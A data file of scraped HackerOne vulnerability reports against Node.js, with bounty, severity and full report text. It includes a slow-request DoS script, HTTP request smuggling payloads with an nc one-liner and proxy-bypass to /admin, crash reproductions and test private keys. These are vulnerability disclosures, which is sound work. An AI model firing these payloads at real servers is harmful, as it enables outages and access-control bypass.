17  let i = 0
18  let interval = setInterval(() => {
19    client.write(body[i])
20    i++
21
22    // Done sending, end the request
23    if (i === body.length) {
24      clearInterval(interval)
25      client.write(`\r\n\r\n`)
26    }
27  }, 60000)
28})
29
30client.on('data', data => {
31  response += data
32  client.end()
33})
34
35client.on('close', () => {
36  const duration = Number(process.hrtime.bigint() - start) / 1e9
37
38  console.log(`Receive the following response (${response.length} bytes) in ${duration.toFixed(3)} s:\n\n`)
39  console.log(response)
40})
Once executed, the client will not receive a response before 4096 minutes. If multiple parallel execution of the code above targets the same server, it will result in service denial. 
Impact
This attack has very low complexity and can easily trigger a DDOS on an unprotected server.
Supporting Material/References:
We have written a patch for Node.js (PR 33304) which introduces a new http.Server option called requestTimeout with a default value in milliseconds of 120000 (2 minutes).
When requestTimeout is a positive value, the server will start a new timer set to expire in requestTimeout milliseconds when a new connection is established. The timer is also set again if new requests after the first are received on the socket (this handles pipelining and keep-alive cases).
The timer is cancelled in the following case:

When the request body is completely received by the server.
When the response is completed. This handles the case where the application responds to the client without consuming the request body.
When the connection is upgraded, like in the WebSocket case.

If the timer expires, then the server responds with status code 408 and closes the connection. This prevents the DOS attack.
Acknowledgement
This research was conducted and co-authored by me and matteo.collina@nearform.com and has been sponsored by NearForm
Impact
If an attacker execute a significative amount of requests on a target server without completing any, the server at some point will reach the allowed number of open connections and will not be able to serve any further request, resulting in a Denial of Service.",https://hackerone.com/reports/868834,California,United States,San Francisco,2020,5,8,7,45
Node.js,11-50,0.0,1m-10m,$250.00,Medium,5.45,HTTP Request Smuggling,HTTP Request Smuggling due to accepting space before colon,"mkg  submitted a report to Node.js.Jun 20th (about 1 year ago)Summary:
The llhttp parser in the httpmodule in Node 16.3.0 accepts requests with a space (SP) right after the header name before the colon. This can lead to HTTP Request Smuggling (HRS).
Description:
When Node receives the following request:
Code 61 BytesWrap lines Copy Download1GET / HTTP/1.1
2Host: localhost:5000
3Content-Length : 5
4
5hello
It interprets the request as having the body hello. Here is the relevant section of the code: https://github.com/nodejs/llhttp/blob/master/src/llhttp/http.ts#L410-L415
How could this lead to HRS? Imagine that Node is placed behind a proxy which ignores the CL header with a space before the colon, but forwards it as is. Then the following attack can be performed:
Code 123 BytesWrap lines Copy Download1GET / HTTP/1.1
2Host: localhost:5000
3Content-Length : 23
4
5GET / HTTP/1.1
6Dummy: GET /smuggled HTTP/1.1
7Host: localhost:5000
8
The proxy would see the first and the second GET-request. But Node would see the first and the third GET-request.
Steps To Reproduce:
We don't know of any proxy that behaves this way, but here is how to show that Node is behaving in the described way. Run the following code like this: node app.js
Code 568 BytesWrap lines Copy Download1const http = require('http');
2
3// https://nodejs.org/en/docs/guides/anatomy-of-an-http-transaction/
4
5http.createServer((request, response) => {
6  let body = [];
7  request.on('error', (err) => {
8    response.end(""error while reading body: "" + err)
9}).on('data', (chunk) => {
10    body.push(chunk);
11}).on('end', () => {
12    body = Buffer.concat(body).toString();
13
14    response.on('error', (err) => {
15        response.end(""error while sending response: "" + err)
16    });
17
18    response.end(""Body length: "" + body.length.toString() + "" Body: "" + body);
19  });
20}).listen(5000);
Then send a request with a space between the CL header and the colon. This can be done with the following one-liner:
Code 104 BytesWrap lines Copy Download1echo -en ""GET / HTTP/1.1\r\nHost: localhost:5000\r\nContent-Length : 5\r\n\r\nhello"" | nc localhost 5000
See that Node interpreted the body as hello.
Supporting Material/References:
Relevant section of RFC 7230 (second paragraph of https://datatracker.ietf.org/doc/html/rfc7230#section-3.2.4):
Code 490 BytesWrap lines Copy Download1   No whitespace is allowed between the header field-name and colon.  In
2   the past, differences in the handling of such whitespace have led to
3   security vulnerabilities in request routing and response handling.  A
4   server MUST reject any received request message that contains
5   whitespace between a header field-name and colon with a response code
6   of 400 (Bad Request).  A proxy MUST remove any such whitespace from a
7   response message before forwarding the message downstream.
Impact
Depending on the specific web application, HRS can lead to cache poisoning, bypassing of security layers, stealing of credentials and so on.",https://hackerone.com/reports/1238709,California,United States,San Francisco,2021,6,20,11,10
Node.js,11-50,0.0,1m-10m,$250.00,High,7.4,Improper Input Validation,HTTP header values do not have trailing OWS trimmed,"alyssawilk  submitted a report to Node.js.Nov 6th (3 years ago)[I suspect I may have tagged the wrong vulnerability type -I'm failing to find ""insufficient validation of user input""]
According to the HTTP-spec, http values are
field-value    = *( field-content | LWS )
http_parser does not appear to trim trailing LWS. This means if a user sends ""Host: foo\r\n"" the string literal ""foo"" is passed up, but if the user sends ""Host: foo \r\n"" the string literal ""foo "" is passed up, complete with trailing LWS.
Steps To Reproduce:
(Add details for how we can reproduce the issue)
If one hands ""GET / HTTP/1.1\r\nHost: foo.com \r\nHello: World\r\n\r\n""
to http_parser, http_parser sends on_header_value ""foo.com "" instead of ""foo.com""
Impact: [add why this issue matters]
We are trying to address an issue with Envoy, where if
""GET / HTTP/1.1\r\nHost: my-super-private-domain.com \r\nHello: World\r\n\r\n""
is passed to Envoy, and Envoy is configured to block any requests to ""my-super-private-domain.com"", the matcher fails due the trailing whitespace, and external users can tunnel requests that should be blocked.
Originally we were going to address this by doing whitespace trimming in Envoy, but this should probably be fixed upstream in http_parser in case other users are affected, so we're reaching out to see what folks on your end think.
Supporting Material/References:
My Envoy regression test verifies this lack of LWS trimming, but this is current under envoy security embargo, so please don't share
TEST_F(Http1ServerConnectionImplTest, LWS) {
initialize();                                                                                      
  InSequence sequence;                                                                               
  Http::MockStreamDecoder decoder;
EXPECTCALL(callbacks, newStream(, )).WillOnce(ReturnRef(decoder));                             
  TestHeaderMapImpl expectedheaders{
{""Test"", ""value ""},      // note the LWS after value is passed up from http_parser to Envoy :-(
{""Hello"", ""World""},
{"":path"", ""/""},
{"":method"", ""GET""},
};
EXPECT_CALL(decoder, decodeHeaders(HeaderMapEqual(&expected_headers), true)).Times(1);            
  Buffer::OwnedImpl buffer(""GET / HTTP/1.1\r\nTest: value \r\nHello: World\r\n\r\n"");
codec_->dispatch(buffer);
EXPECT_EQ(0U, buffer.length());
}
Impact
As said above, this could allow privileged escalation, where if one uses an http_parser  enabled server configured to block specific domains, those blocks can be trivially bypassed using white-space. It's possible there are other attacks bypassing http_parser header value checks with whitespace, but I haven't investigated beyond the most obvious exploit",https://hackerone.com/reports/730779,California,United States,San Francisco,2019,11,6,17,46
Node.js,11-50,0.0,1m-10m,$500.00,High,8.5,HTTP Request Smuggling,HTTP Request Smuggling due to CR-to-Hyphen conversion,"amitklein  submitted a report to Node.js.Jul 13th (2 years ago)
NOTE! Thanks for submitting a report! Please replace all the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!

Summary: [add summary of the vulnerability]
Apparently, node.js converts CR in HTTP request headers to hyphen before parsing. This can lead to HTTP Request Smuggling as it is a non-standard interpretation of the header.
Description: [add more details about this vulnerability]
Consider an HTTP request with Content[CR]Length header . Suppose a proxy in front of node.js ignores the Content[CR]Length header (and therefore assumes a 0-length body). node, on the other hand, converts the CR to a hyphen and uses the value of the (newly formed...) Content-Length header. HTTP Request Smuggling ensues.
Steps To Reproduce:
This is the HTTP stream that demonstrates the vulnerability:
GET / HTTP/1.1
Host: www.example.com
Content[CR]Length: 42
Connection: Keep-Alive
GET /proxy_sees_this HTTP/1.1
Something: GET /node_sees_this HTTP/1.1
Host: www.example.com
A proxy server that ignores the invalid Content[CR]Length header will assume that the body length is 0 (since there's no body length indication), and will thus transmit the stream up to (but not including) the GET /proxy_sees_this. It will wait for node to respond (which interestingly does happen, even though node.js does expect the body - perhaps on GET requests, the URL is invoked regardless of the body?), then the proxy forwards the second request (from its perspective) - the GET /proxy_sees_this. Node then silently discards the expected 42 bytes of the body of the first request, and thus starts parsing the 2nd request from GET /node_sees_this.
HTTP Request Smuggling ensues.
[Also, if you were able to find the piece of code responsible for this issue, please add a link to it in the source repository.]
Impact: [add why this issue matters]
HTTP Request Smuggling can lead to web cache poisoning, session hijacking, cross site scripting, etc.
Supporting Material/References:

List any additional material (e.g. screenshots, logs, references, commits, code examples, etc.).

Impact
HTTP Request Smuggling can lead to web cache poisoning, session hijacking, cross site scripting, etc.",https://hackerone.com/reports/922597,California,United States,San Francisco,2020,7,13,14,57
Node.js,11-50,0.0,1m-10m,$250.00,Medium,5.45,HTTP Request Smuggling,HTTP Request Smuggling due to ignoring chunk extensions,"mkg  submitted a report to Node.js.Jun 19th (about 1 year ago)Summary:
The llhttp parser in the http module in Node 16.3.0 ignores chunk extensions when parsing the body of chunked requests. This leads to HTTP Request Smuggling (HRS) when a Node server is put behind an Apache Traffic Server (ATS) 9.0.0 proxy.
Description:
In the chunked transfer encoding format there can be a so called chunk extension after each chunk size. Example:
Code 75 BytesWrap lines Copy Download1GET / HTTP/1.1
2Host: localhost
3Transfer-Encoding: chunked
4
55 ; a=b
6hello
70
8
In the example above the chunk extension would be ; a=b. You can read more here https://datatracker.ietf.org/doc/html/rfc7230#section-4.1.1 and here https://www.rfc-editor.org/errata/eid4667 .
llhttp doesn't try to parse the chunk extension properly, but simply ignores every byte until it reaches a \r (source: https://github.com/nodejs/llhttp/blob/master/src/llhttp/http.ts#L736-L739). By following the ABNF of chunk extensions one can see that the only allowed bytes in this area are 0x09, 0x21-0x7e and 0x80-0xff. But llhttp allows any byte. This is the bug.
Notably we can put a \n in this area. This allows us to perform HRS when combined with ATS. This is because ATS also incorrectly parses the chunked extension. ATS looks for the first \n character and doesn't verify whether it was preceded by a \r. We arrive at the following attack:
Code 148 BytesWrap lines Copy Download1GET / HTTP/1.1
2Host: localhost:8080
3Transfer-Encoding: chunked
4
52 \nxx
64c
70
8
9GET /admin HTTP/1.1
10Host: localhost:8080
11Transfer-Encoding: chunked
12
130
14
By sending the data above when ATS is a proxy in front of Node, ATS will see one request to / and Node will see two requests, one to / and one to /admin. Note that all lines are terminated by CRLF (\r\n) and that \n should be replaced with an LF character.
Usually with HRS it is possible to smuggle a request past a proxy directly to the server and then get a response for the smuggled request back to the attacker. But due to a bug in ATS where the connection hangs after a chunked request is sent, we can in this case only send a smuggled request and not see the response. But we have full control over the headers and body of the smuggled request.
Both these bugs have been reported to ATS and have not been fixed yet.
Steps To Reproduce:
This Proof of Concept requires docker and docker-compose.
Unzip the attached poc.zip. Start the systems with sudo docker-compose up --build. Now Node can be accessed directly at http://localhost:8081 and ATS (forwarding to Node) can be accessed at http://localhost:8080
Node behaves like this:
Code 124 BytesWrap lines Copy Download1$ curl http://localhost:8081
2INDEX
3$ curl http://localhost:8081/admin
4ADMIN
5$ curl http://localhost:8081/forbidden
6FORBIDDEN
Note that when /admin is requested, then /admin was reached! is printed in the docker-compose terminal.
ATS behaves like this:
Code 128 BytesWrap lines Copy Download1$ curl http://localhost:8080
2INDEX
3$ curl http://localhost:8080/admin
4FORBIDDEN
5$ curl http://localhost:8080/forbidden
6FORBIDDEN
Note that all requests to /admin are rerouted to /forbidden by ATS. So the /admin endpoint can't be reached.
Now it's time to send the attack described above. This can be done by using the included payload.py. The attack can be sent using the following command:
Code 38 BytesWrap lines Copy Download1python3 payload.py | nc localhost 8080
When the attack is sent, we see /admin was reached! being printed in the terminal. So we bypassed the proxy and reached /admin.
(As mentioned before, due to a bug in ATS, the response to the smuggled request can't be seen. If ATS would not have had the mentioned bug, then payload2.py could have been used to both send a request and see the response.)
Impact
If the proxy is acting as an access control system, only allowing certain requests to come through, it can be bypassed, allowing any request to be sent.1 attachment:F1344561: poc.zip",https://hackerone.com/reports/1238099,California,United States,San Francisco,2021,6,19,8,43
Node.js,11-50,0.0,1m-10m,$250.00,Critical,9.0,HTTP Request Smuggling,HTTP request smuggling using malformed Transfer-Encoding header,"erubinson  submitted a report to Node.js.Nov 12th (3 years ago)Please see the attached PDF for a writeup of this vulnerability.
Impact
Please see the attached PDF for a writeup of this vulnerability.1 attachment:F632019: Security_Vulnerability_in_Node_-_Disclosure.pdf",https://hackerone.com/reports/735748,California,United States,San Francisco,2019,11,12,1,11
Node.js,11-50,0.0,1m-10m,$250.00,Critical,9.3,Denial of Service,Malformed HTTP/2 SETTINGS frame leads to reachable assert,"jzebor  submitted a report to Node.js.Feb 20th (3 years ago)I do not expect any form of cash bounty for this issue. If we have discovered a unique vulnerability I only ask that Jordan Zebor and Adam Cabrey of F5 Networks be crediting with finding the issue.
Summary: A reachable assert in the NodeJS HTTP/2 implementation can result in a denial of service. 
Description: Attackers can send a series of malformed HTTP/2 SETTINGS frames to reach an assertion in code, causing the node process to exit with SIGABRT. This has been observed in v13.8.0 and v14.0.0-nightly20200213e23b12e130.
Steps To Reproduce:
1) Create an example HTTP/2 server. I used the example code from here https://nodejs.org/api/http2.html#http2_http2_createsecureserver_options_onrequesthandler
2) Create an example client to send the attached cases in a loop. In this case, I used an internal fuzz testing tool that I unfortunately cannot share but I can attach the test cases which I sent. We discovered that by sending a malformed SETTINGS frame over and over (roughly 25 in a row) the node process will SIGABRT. 
3) Observe node process crash after series of requests are sent. I can consistently trigger this issue in 13.8.0 and 14.0.0. I will provide a stack trace, stack trace when run under valgrind, and the test case I used to reproduce the issue. If the core file is needed I can provide that as well.
I believe this is where the assertion is triggered.
https://github.com/nodejs/node/blob/f3682102dca1d24959e93de918fbb583f19ee688/src/node_http2.cc#L1521
Impact: A reachable assert which leads to SIGBART of the entire node process. It's a denial of service issue.
Supporting Material/References:
Notice with the attached examples are prefixed with the order in which they were sent. If you already know how to do all the connection preface setup then simply send the settings anomaly frame on a new connection over and over again. A visual representation of the settings frame which causes the issue can be seen in ""SETTINGS_FRAME_DETAILS.png"".
Impact
A reachable assert which leads to SIGBART of the entire node process. It's a denial of service issue that an unauthenticated attacker can easily achieve. The CVSS calculator on this portal seems to be classifying the issue as ""Critical"", which I don't agree with. I believe this to be a ""High"" severity issue with this CVSS score - https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H5 attachments:F722191: 1_connection_preface_frameF722192: 2_headers_frameF722193: 3_server_settings_ack_frameF722195: 4_settings_anomalyF722197: SETTINGS_FRAME_DETAILS.png",https://hackerone.com/reports/800140,California,United States,San Francisco,2020,2,20,0,15
Node.js,11-50,0.0,1m-10m,$250.00,High,8.5,Memory Corruption - Generic,napi_get_value_string_X allow various kinds of memory corruption,"tniessen  submitted a report to Node.js.Jan 27th (3 years ago)Summary:
napi_get_value_string_latin1, napi_get_value_string_utf8, napi_get_value_string_utf16 are vulnerable to buffer overflows, partially due to an integer underflow.
Description:
napi_get_value_string_latin1, napi_get_value_string_utf8, and napi_get_value_string_utf16 behave like this:

If the output pointer is NULL, return.
Write min(string_length, bufsize - 1) bytes to the output buffer. Note that bufsize is an unsigned type, so this leads to an integer underflow for bufsize == 0. Since this is a size_t, the underflow will cause the entire string to be written to memory, no matter how long the string is.
Finally, write to buf[copied], where copied is the number of bytes previously written. Even if step 2 hadn't written out of bounds, this would (for bufsize == 0).

Steps To Reproduce:
Code 230 BytesWrap lines Copy Download1Napi::Value Test(const Napi::CallbackInfo& info) {
2  char buf[1];
3  // This should be a valid call, e.g., due to a malloc(0).
4  napi_get_value_string_latin1(info.Env(), info[0], buf, 0, nullptr);
5  return info.Env().Undefined();
6}
Code 128 BytesWrap lines Copy Download1const binding = require('bindings')('validation');
2console.log(binding.test('this could be code that might later be executed'));
Running the above script corrupts the call stack:
Code 120 BytesWrap lines Copy Download1tniessen@local-vm:~/validation-fails$ node .
2*** stack smashing detected ***: <unknown> terminated
3Aborted (core dumped)
The best outcome is a crash, but a very likely outcome is data corruption. If the attacker can control the string's contents, they can even insert code into the process heap, or modify the call stack. Depending on the architecture and application, this can lead to various issues, up to remote code execution.
It is perfectly valid to pass in a non-NULL pointer for buf while specifying bufsize == 0. For example, malloc(0) is not guaranteed to return NULL.  A npm package might correctly work on one machine based on the assumption that malloc(0) == NULL, but might create severe security issues on a different host. Passing a non-NULL pointer is also not ruled out by the documentation of N-API, so it is not valid to assume that buf will always be NULL if bufsize == 0.
Impact
npm packages and other applications that use N-API may involuntarily open up severe security issues, that might even be exploitable remotely. Even if buf is a valid pointer, passing bufsize == 0 allows to write outside of the boundaries of that buffer.
Step 2 of the description allows an attacker to precisely define what is written to memory by passing in a custom string. Depending on whether the pointer points to heap or stack, possible results include data corruption, crashes (and thus DoS), and possibly even remote code execution, either by writing instructions to heap memory or by corrupting the stack.
Many attacks are likely caught by kernel and hardware protection mechanisms, but that depends on the specific hardware, kernel, and application, and memory layout. Even if they are caught, the entire process will crash (which is still good compared to other outcomes).",https://hackerone.com/reports/784186,California,United States,San Francisco,2020,1,27,16,49
Node.js,11-50,0.0,1m-10m,$250.00,Medium,6.5,Buffer Over-read,OOB read in libuv,"ericsesterhenn  submitted a report to Node.js.May 26th (about 1 year ago)Summary: 
The pointer p is read and increased without checking whether it is beyond pe, with the latter holding a pointer to the end of the buffer. This can lead to information disclosures or crashes. This function can be triggered via uv_getaddrinfo().  nodejs seems to use libuv and is possibly affected by this as well.
Description:
An out-of-bound read can occur when uv__idna_toascii() is used to convert strings to ASCII. The pointer p is read and increased without checking whether it is beyond pe, with the latter holding a pointer to the end of the buffer. This can lead to information disclosures or crashes. This function can be triggered via uv_getaddrinfo().  nodejs seems to use libuv and is possibly affected by this as well.
Steps To Reproduce:
i attached a testcase and the ad-hoc fuzzer I used to identify the issues. If you need further help reproducing, please let me know.
Code 571 BytesWrap lines Copy Download1static unsigned uv__utf8_decode1_slow(const char** p,
2                                      const char* pe,
3                                      unsigned a) {
4  unsigned b;
5  unsigned c;
6  unsigned d;
7  unsigned min;
8
9  if (a > 0xF7)
10    return -1;
11
12  switch (*p - pe) {
13  default:
14    if (a > 0xEF) {
15      if (p + 3 > pe)
16        return -1;
17      min = 0x10000;
18      a = a & 7;
19      b = (unsigned char) *(*p)++;   // OOB READ
20      c = (unsigned char) *(*p)++;   // OOB READ
21      d = (unsigned char) *(*p)++;   // OOB READ
22      break;
23    }
24    /* Fall through. */
Impact: [add why this issue matters]
Possiblity to crash the process when untrusted hostnames are passed to uv__getaddrinfo()
Supporting Material/References:



Misc
This issue was found during an audit of Cure53 for ExpressVPN but ExpressVPN is not affected by the issue. I reported it to the libuv project, whose maintainers suggested that i report it to nodejs directly as well.
Impact
An oob read that does not seem to be abused to leak data, but possibly read to a guarded page which segfaults the process.3 attachments:F1315537: desc.txtF1315538: fuzz.tar.bz2F1315539: testcase_oob_read",https://hackerone.com/reports/1209681,California,United States,San Francisco,2021,5,26,6,22
Node.js,11-50,0.0,1m-10m,$250.00,Critical,9.3,Improper Certificate Validation,Remotely trigger an assertion on a TLS server with a malformed certificate string,"rogierschouten  submitted a report to Node.js.Nov 26th (3 years ago)Summary:
Connecting to a NodeJS TLS server with a client certificate that has a type 19 string in its subjectAltName will crash the TLS server if it tries to read the peer certificate.
Affected versions include v10.17.0 and v13.1.0.
This is related to issue https://github.com/nodejs/node/issues/30521 but it works the other way around: in that issue, the client crashes; in this example, the server crashes. 
It is likely that the fix for that issue will also fix this.
Description:
Using e.g. node-forge it is possible to create certificates without common name and with any subjectAltName content.  Hence anybody can create a malformed certificate and send it to a node server. The server will encounter an assertion in node_crypto.cc
Steps To Reproduce:

Store all files below  (under supporting material) in the same directory
Start node ./server.js
Start node ./client.js
Result: assertion error in the server

Impact:
Anybody can remotely connect to a TLS server and supply an invalid certificate, causing the server to crash, hence this is a denial-of-service possibility.
Supporting Material/References:
server.js:
Code 663 BytesWrap lines Copy Download1const tls = require(""tls"");
2const fs = require(""fs"");
3
4let server = tls.createServer({
5    ca: fs.readFileSync(""./ca.crt""),
6    cert: fs.readFileSync(""./server.crt""),
7    key: fs.readFileSync(""./server.key""),
8    requestCert: true,
9    rejectUnauthorized: true
10}, (socket) => {
11    socket.setEncoding(""utf8"");
12    socket.on(""data"", (data) => {
13        console.log(""server.socket.data"", data);
14        socket.write(data);
15    });
16    socket.on(""end"", () => undefined);
17    socket.on(""error"", () => undefined);
18
19    // THIS CRASHES THE SERVER
20    console.log(socket.getPeerCertificate());
21});
22server.listen({ port: 12345 }, () => {
23    console.log(""listening!"")
24});
client.js:
Code 424 BytesWrap lines Copy Download1const tls = require(""tls"");
2const fs = require(""fs"");
3const client = tls.connect({
4    host: ""pc57.network.local"",
5    port: 12345,
6    ca: [fs.readFileSync(""./server.crt"")],
7    key: fs.readFileSync(""./client.key""),
8    cert: fs.readFileSync(""./client.crt"")
9}, () => {
10    client.write(""foo"");
11    client.end();
12});
13client.on(""data"", () => undefined);
14client.on(""error"", () => undefined);
15client.on(""end"", () => undefined);
ca.crt:
Code 1.24 KiBWrap lines Copy Download1-----BEGIN CERTIFICATE-----
2MIIDezCCAmOgAwIBAgIJAPP+kRMqzgNDMA0GCSqGSIb3DQEBCwUAMFQxCzAJBgNV
3BAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBX
4aWRnaXRzIFB0eSBMdGQxDTALBgNVBAMMBG15Y2EwHhcNMTkxMTI2MTUxNjEwWhcN
5MjAxMTI1MTUxNjEwWjBUMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0
6ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMQ0wCwYDVQQDDARt
7eWNhMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmK5z7YRTmxYEhm3/
8lDrvJWiqsBS3fiq79YSfHlNIbVhgE6ObTTl2WOHJWU/Mw2dKr7l2/fL2R+7O98rt
9MfI26aet5r73eu/4Kd/11mRUZ6CSAtzIaP+L7i4dRqR+XOfYTMEbi//Kuh2EvBha
10cgB2jFaG1duu/bqTM1In7vKzJEUREd/EoYYBjt4UC5r6mIZ+CqYarfSmOGJ8BXGA
11bewesTjqBoJ5DjsZzHkY7BdJzrD9OvCs9XChxeYfaojSGvs5gUJHEhFM6/G1xipv
12Qr1VK0aADths9hQnV/8pj1dZLJqvEqEjqct16/CdVjI7B+xBTmhAvL43rxTar/EH
13thmt7wIDAQABo1AwTjAdBgNVHQ4EFgQUSe33PfECxbQKWq5XfHj14xNcUsAwHwYD
14VR0jBBgwFoAUSe33PfECxbQKWq5XfHj14xNcUsAwDAYDVR0TBAUwAwEB/zANBgkq
15hkiG9w0BAQsFAAOCAQEAEDQAzjx4r+2Z1YaCIbToyD+BMuv250Tiwd4MrvKOx7LT
16opnWwqn50KtLOfPCd+peNfsxOy9OCC+PqVnOKTnTIOOtv49pRsG3f1SmFjzHfPOC
17tL0n7M4WGHDW0ITbuZWhmOMpeiQQLF45p2lcXT49vllRpta86501f+jUW/47nQfU
18pGjk4Qbw18jXrAe1qsedisKL9VWdaj1Quxd0XVV2w7kGw6cHBlTNyJd+UeyczheQ
19xM7svOeuCMLRMFusxq8Lo6CAwbNiSa/GW7AErHjtruinl9pJXn3FVUvYz9tJ4OrB
20ErCfVLYzVDrohIGYS4PMmypx1Bxhlg5JIyoR3JRUuQ==
21-----END CERTIFICATE-----
ca.key:
Code 1.66 KiBWrap lines Copy Download1-----BEGIN PRIVATE KEY-----
2MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCYrnPthFObFgSG
3bf+UOu8laKqwFLd+Krv1hJ8eU0htWGATo5tNOXZY4clZT8zDZ0qvuXb98vZH7s73
4yu0x8jbpp63mvvd67/gp3/XWZFRnoJIC3Mho/4vuLh1GpH5c59hMwRuL/8q6HYS8
5GFpyAHaMVobV2679upMzUifu8rMkRRER38ShhgGO3hQLmvqYhn4Kphqt9KY4YnwF
6cYBt7B6xOOoGgnkOOxnMeRjsF0nOsP068Kz1cKHF5h9qiNIa+zmBQkcSEUzr8bXG
7Km9CvVUrRoAO2Gz2FCdX/ymPV1ksmq8SoSOpy3Xr8J1WMjsH7EFOaEC8vjevFNqv
88Qe2Ga3vAgMBAAECggEAScIdJuUCLq2YSgjhqw49cWj67E1Vx5GFc7o51ECPgKNs
95o/m+ouD7LRGvOqcFNnVbsa+AThaWa24NmTF6ZcFiCMFE6+1hqJe1HvpG0UksVsU
10rmVSO8cYJlwIsJPOp7so9wti72MG4JpaATQSnXgzzOAQC0gxZUm4ytYpjHmaqS4l
11WdvCVzZJLOry5r6rjH4c72kp7hGo6+jXo9YgbSa1etDND4JCidrwks7e3SIiTw4m
12Z5GbjfPU/Rtttzde72cU7WlGysVDzAJrmf4p/p8a3/aXouYoRHI/cgRadWzIfR/c
13W1zFZWnZ24bbkjMjyFvq46lnW19JW+Zpjle/4dfkAQKBgQDKkhN5sSvZEXgDzOrz
14vKyeqpuQ1XuZ8LwKyr39ixdf6/QsWYvCe7lIqTy+KLakWCd9SNDnzKYLbGnsF5Bs
15sYk/yofM+VYGGQYvmLWKaigh3M+zoRfasLcfHxUSD2+CjLz+lslN3izNV5HO+jQQ
16tRbjTgcokcHLGQGufYrOITOMbwKBgQDA88X77oDnGPA0ZDGLaOuur4ZfF+81HgJ2
17sJykZmExQTkps3AdXAdHkOKepwlSr560ll104s398Ezb4LlGukm8vfShEgDskyca
18sj7QwRepoIpWXMHfMgiuRcGoi+lHQxG35ZC81zy6Uzl02x0ib46a+QCnUIxIZneF
198cQiBce2gQKBgGyqN7BMDk1/RXYkctUVHTRwKMtk+cz2iqjvYUOlXYCjPnScBJDr
20ddU4k9EeXfuDHovih84QxfHS0m9HpL3p7so9huO5zR+wRNU7ggciMy0XGoQtonI5
214cHcFp19kj/h53BaytnumPH+S8VQCqX7vq9oqAZnSiH85B4KUm+I9/IZAoGAEIdR
22WGlv5Vv/h51lmRmdxtMGYbL9LMGrWFt8r6CNhtidevMCEaHGhdzlbM3GQK0GnVWc
23H90l5DDnhJZViLeAhYiIIhwWtC1O1jyaoOtJiaBU+Vzsxp/UmokjM7r4esBGDki+
24A080xolGjLoQXtjLkH7wDWUa/0C30GOLd5ajKwECgYEAlJAuaQ9LNF2Hx7BZZaPI
25qKX0pNrZmEvt9WNItmw7q6KDinJ7yRm2daM4LVvKPKu7g/YfZ1nA8vTVueBnCMUB
26QPIxbBdcgthgeRc2a0kmYZ6uQ4FI0cWJ3X/sA7PWxYbi01vWvp0drvptW3XfKtVh
271edcWLe7QmNpWS61IKxT+Jg=
28-----END PRIVATE KEY-----
client.crt:
Code 1.35 KiBWrap lines Copy Download1-----BEGIN CERTIFICATE-----
2MIID0DCCArigAwIBAgIBATANBgkqhkiG9w0BAQUFADBUMQswCQYDVQQGEwJBVTET
3MBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQ
4dHkgTHRkMQ0wCwYDVQQDDARteWNhMB4XDTE5MTEyNjE1MjczM1oXDTIwMTEyNjE1
5MjczM1owUzELMAkGA1UEBhMCVVMxETAPBgNVBAgTCFZpcmdpbmlhMRMwEQYDVQQH
6EwpCbGFja3NidXJnMQ0wCwYDVQQKEwRUZXN0MQ0wCwYDVQQLEwRUZXN0MIIBIjAN
7BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnVBta6GIai7hY96+mhJxgLEWT6Ds
82GF37ekF+aDgfAOavk/pVIbeN0wN9hCjkfg4AvFCYHoqXOhCt49s6t1TCakbntZm
9uZyKpIMTG7O8kNvBwq3LMU7TIUsicKAHoBu+ALjqYT4gcWOWGC6LkPMwceE8UQV0
10+U8YLZdiG1OshtYgPvLwj6LSYwQtu2nN5bklJzXF5HALfb7vDY5BKFCJa6eHafZi
112bhX4mjMvbeGPoHuKye0Zx/lBjcgAmElb7uhwkWRcTOkfwm6nfA0go6qxwGT+eFg
12I5J4lB5t0t8ipCq5HV9Shh/GNMTItUraTU9pE3d8mNmSEkci4s41rvKOHQIDAQAB
13o4GtMIGqMAwGA1UdEwQFMAMBAf8wCwYDVR0PBAQDAgL0MDsGA1UdJQQ0MDIGCCsG
14AQUFBwMBBggrBgEFBQcDAgYIKwYBBQUHAwMGCCsGAQUFBwMEBggrBgEFBQcDCDAR
15BglghkgBhvhCAQEEBAMCAPcwHgYDVR0RBBcwFYcEfwAAAZMNbWUtdGhlLWNsaWVu
16dDAdBgNVHQ4EFgQUjc1t9QXJgsZFh2qL22onwUgpLbYwDQYJKoZIhvcNAQEFBQAD
17ggEBAIEOiqFnxruDmue3jMn4IfP5rYnKEr5ag/XF8iIYum7jRYnr8VvmHzQUMtek
18t++vai8hdvSxG4vsOKcdzXmThL8U/ZxEmId8UvEqKGJNfC1cu1evj8rV1D+9YS63
199XTgJXsI1OOCSL3I02KwAkRbjAR7SLLIWwtxwAOzWGyLbpbsQ+TTKTcztddBHFA1
20F5vbZWTYk13BHJE/d74ZEs5dUBQM7zdhwlYLTaTd1r5lTWl4wwBjhXD0zMsKUUtB
21pP7ZIsJZzSGZ3QQpLXTWRIKXUjANl95rqpI/FN6VkRMf2XuHEvKDMySDlN1Rh1bz
22aZf59tRX9W/gqwiKqICO4UE5Z+I=
23-----END CERTIFICATE-----
client.key:
Code 1.63 KiBWrap lines Copy Download1-----BEGIN RSA PRIVATE KEY-----
2MIIEogIBAAKCAQEAnVBta6GIai7hY96+mhJxgLEWT6Ds2GF37ekF+aDgfAOavk/p
3VIbeN0wN9hCjkfg4AvFCYHoqXOhCt49s6t1TCakbntZmuZyKpIMTG7O8kNvBwq3L
4MU7TIUsicKAHoBu+ALjqYT4gcWOWGC6LkPMwceE8UQV0+U8YLZdiG1OshtYgPvLw
5j6LSYwQtu2nN5bklJzXF5HALfb7vDY5BKFCJa6eHafZi2bhX4mjMvbeGPoHuKye0
6Zx/lBjcgAmElb7uhwkWRcTOkfwm6nfA0go6qxwGT+eFgI5J4lB5t0t8ipCq5HV9S
